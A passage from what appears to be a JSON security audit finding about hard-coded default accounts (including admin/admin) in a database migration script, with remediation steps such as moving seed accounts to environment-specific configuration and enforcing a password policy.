            "snippetStartLine": 5,
            "summary": "Three user accounts with trivially guessable credentials (including admin/admin) are hard-coded in the database migration script.",
            "remediationSummary": "Remove hard-coded default credentials from the migration script; provision accounts through out-of-band, environment-specific secret management.",
            "remediation": "1. **Remove all hard-coded default accounts** from the migration. Do not seed any user rows whose credentials are checked into source control.\n2. If seed accounts are needed for development/testing, supply them via **environment-specific configuration** (e.g. a separate `V1__seed_dev.sql` migration applied only in non-production profiles, or values injected from a secrets manager at deploy time).\n3. Enforce a **strong-password policy** at the application layer so that any programmatically created account must use a complex, unique password.\n4. Remove or disable the `admin` account in any production deployment and implement a proper first-run account-creation workflow."
